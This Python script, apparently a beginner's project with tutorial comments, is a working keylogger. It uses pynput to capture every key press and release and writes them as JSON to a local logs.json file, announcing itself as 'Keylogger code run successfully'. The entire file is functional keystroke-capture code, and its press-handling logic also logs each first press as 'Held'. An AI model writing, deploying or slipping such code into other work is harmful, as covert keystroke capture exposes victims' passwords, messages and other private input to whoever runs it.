from pynput import keyboard
import json

# decalre 3 variables as global
list_of_keys = []
# x value initialize with False
x = False
key_strokes = ""


def update_json_file(list_of_keys):
    with open('logs.json', '+wb') as key_log:
        # as means rename of open('logs.json','+wb')
        list_of_keys_byte = json.dumps(list_of_keys).encode()
        key_log.write(list_of_keys_byte)


# funtion declaration for pressing key
def on_press(key):
    global x, list_of_keys
    if x == False:
        list_of_keys.append(
            {'pressed': f'{key}'}
        )
        # reinitialize the x value
        x = True
    if x == True:
        list_of_keys.append(
            {'Held': f'{key}'}
        )
        # now call the update_json_file() funtion with list_of_key parameter
    update_json_file(list_of_keys)


# funtion declaration for releasing key
def on_release(key):
    global x, list_of_keys, key_strokes
    list_of_keys.append(
        {'Released': f'{key}'}
    )
    if x == True:
        x = False
    # now call the update_json_file() funtion with list_of_key parameter
    update_json_file(list_of_keys)


print("[+] Keylogger code run successfully!")
print("\n [!] Saving the key logs into the 'logs.json")


with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
